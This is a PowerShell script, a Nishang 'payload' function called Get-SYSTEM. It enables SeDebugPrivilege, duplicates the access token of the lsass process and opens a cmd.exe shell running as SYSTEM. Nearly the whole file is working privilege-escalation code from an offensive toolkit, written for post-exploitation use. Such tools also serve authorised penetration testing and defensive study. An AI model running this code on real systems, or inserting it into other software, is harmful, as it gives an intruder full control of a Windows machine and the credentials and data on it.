function Get-SYSTEM {
  <#
  .SYNOPSIS
  Nishang payload which duplicates the Access token of lsass and sets it in the current process thread.

  .DESCRIPTION
  This payload duplicates the Access token of lsass and sets it in the current process thread.
  The payload must be run with elevated permissions.

  .EXAMPLE
  PS > Get-SYSTEM

  .LINK
  http://www.truesec.com
  http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/05/use-powershell-to-duplicate-process-tokens-via-p-invoke.aspx
  https://github.com/samratashok/nishang

  .NOTES
  Goude 2012, TreuSec
  #>
  [CmdletBinding()]
  param()

  $signature = @'
      [StructLayout(LayoutKind.Sequential, Pack = 1)]
      public struct TokPriv1Luid
      {
          public int Count;
          public long Luid;
          public int Attr;
      }

      public const int SE_PRIVILEGE_ENABLED = 0x00000002;
      public const int TOKEN_QUERY = 0x00000008;
      public const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
      public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;

      public const UInt32 STANDARD_RIGHTS_READ = 0x00020000;
      public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;
      public const UInt32 TOKEN_DUPLICATE = 0x0002;
      public const UInt32 TOKEN_IMPERSONATE = 0x0004;
      public const UInt32 TOKEN_QUERY_SOURCE = 0x0010;
      public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040;
      public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080;
      public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100;
      public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
      public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
        TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
        TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
        TOKEN_ADJUST_SESSIONID);

      public const string SE_TIME_ZONE_NAMETEXT = "SeTimeZonePrivilege";
      public const int ANYSIZE_ARRAY = 1;

      [StructLayout(LayoutKind.Sequential)]
      public struct LUID
      {
          public UInt32 LowPart;
          public UInt32 HighPart;
      }

      [StructLayout(LayoutKind.Sequential)]
      public struct LUID_AND_ATTRIBUTES {
         public LUID Luid;
         public UInt32 Attributes;
      }

      public struct TOKEN_PRIVILEGES {
          public UInt32 PrivilegeCount;
          [MarshalAs(UnmanagedType.ByValArray, SizeConst=ANYSIZE_ARRAY)]
          public LUID_AND_ATTRIBUTES [] Privileges;
      }

      [DllImport("advapi32.dll", SetLastError=true)]
      public extern static bool DuplicateTokenEx(IntPtr hExistingToken, UInt32 dwDesiredAccess,
          IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

      [DllImport("advapi32.dll", SetLastError=true)]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool SetThreadToken(
        IntPtr PHThread,
        IntPtr Token
      );

      [DllImport("advapi32.dll", SetLastError=true)]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool OpenProcessToken(IntPtr ProcessHandle,
         UInt32 DesiredAccess, out IntPtr TokenHandle);

      [DllImport("advapi32.dll", SetLastError = true)]
      public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);

      [DllImport("kernel32.dll", ExactSpelling = true)]
      public static extern IntPtr GetCurrentProcess();

      [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
      public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
       ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);

      [DllImport("kernel32.dll", SetLastError=true, CharSet = CharSet.Auto)]
      public static extern bool CreateProcessAsUser(
          IntPtr hToken,
          string lpApplicationName,
          string lpCommandLine,
          IntPtr lpProcessAttributes,
          IntPtr lpThreadAttributes,
          bool bInheritHandles,
          UInt32 dwCreationFlags,
          IntPtr lpEnvironment,
          string lpCurrentDirectory,
          [In] ref STARTUPINFO lpStartupInfo,
          out PROCESS_INFORMATION lpProcessInformation);

      [StructLayout(LayoutKind.Sequential)]
      public struct STARTUPINFO
      {
          public Int32 cb;
          public string lpReserved;
          public string lpDesktop;
          public string lpTitle;
          public Int32 dwX;
          public Int32 dwY;
          public Int32 dwXSize;
          public Int32 dwYSize;
          public Int32 dwXCountChars;
          public Int32 dwYCountChars;
          public Int32 dwFillAttribute;
          public Int32 dwFlags;
          public Int16 wShowWindow;
          public Int16 cbReserved2;
          public IntPtr lpReserved2;
          public IntPtr hStdInput;
          public IntPtr hStdOutput;
          public IntPtr hStdError;
      }

      [StructLayout(LayoutKind.Sequential)]
      public struct PROCESS_INFORMATION
      {
          public IntPtr hProcess;
          public IntPtr hThread;
          public UInt32 dwProcessId;
          public UInt32 dwThreadId;
      }
'@

  $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
  if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
    Write-Warning 'Run the Command as an Administrator'
    Break
  }

  Add-Type -MemberDefinition $signature -Name AdjPriv -Namespace AdjPriv
  $adjPriv = [AdjPriv.AdjPriv]
  [long]$luid = 0

  $tokPriv1Luid = New-Object AdjPriv.AdjPriv+TokPriv1Luid
  $tokPriv1Luid.Count = 1
  $tokPriv1Luid.Luid = $luid
  $tokPriv1Luid.Attr = [AdjPriv.AdjPriv]::SE_PRIVILEGE_ENABLED

  $retVal = $adjPriv::LookupPrivilegeValue($null, 'SeDebugPrivilege', [ref]$tokPriv1Luid.Luid)

  [IntPtr]$htoken = [IntPtr]::Zero
  $retVal = $adjPriv::OpenProcessToken($adjPriv::GetCurrentProcess(), [AdjPriv.AdjPriv]::TOKEN_ALL_ACCESS, [ref]$htoken)

  $retVal = $adjPriv::AdjustTokenPrivileges($htoken, $false, [ref]$tokPriv1Luid, 12, [IntPtr]::Zero, [IntPtr]::Zero)

  if (-not($retVal)) {
    [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    Break
  }

  $process = Get-Process -Name lsass
  [IntPtr]$hlsasstoken = [IntPtr]::Zero
  $retVal = $adjPriv::OpenProcessToken($process.Handle, ([AdjPriv.AdjPriv]::TOKEN_IMPERSONATE -bor [AdjPriv.AdjPriv]::TOKEN_DUPLICATE), [ref]$hlsasstoken)

  [IntPtr]$duplicateTokenHandle = [IntPtr]::Zero
  $retVal = $adjPriv::DuplicateTokenEx($hlsasstoken, [AdjPriv.AdjPriv]::TOKEN_ALL_ACCESS, [IntPtr]::Zero, 2, 1, [ref]$duplicateTokenHandle)

  $STARTUPINFO = New-Object AdjPriv.AdjPriv+STARTUPINFO
  $STARTUPINFO.cb = [System.Runtime.InteropServices.Marshal]::SizeOf([AdjPriv.AdjPriv+STARTUPINFO])
  $STARTUPINFO.lpDesktop = 'winsta0\\default'

  $PROCESS_INFORMATION = New-Object AdjPriv.AdjPriv+PROCESS_INFORMATION

  $retVal = $adjPriv::CreateProcessAsUser($duplicateTokenHandle, $null, 'cmd.exe', [IntPtr]::Zero, [IntPtr]::Zero, $false, 0, [IntPtr]::Zero, $null, [ref]$STARTUPINFO, [ref]$PROCESS_INFORMATION)

  if (-not($retVal)) {
    [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
  }
}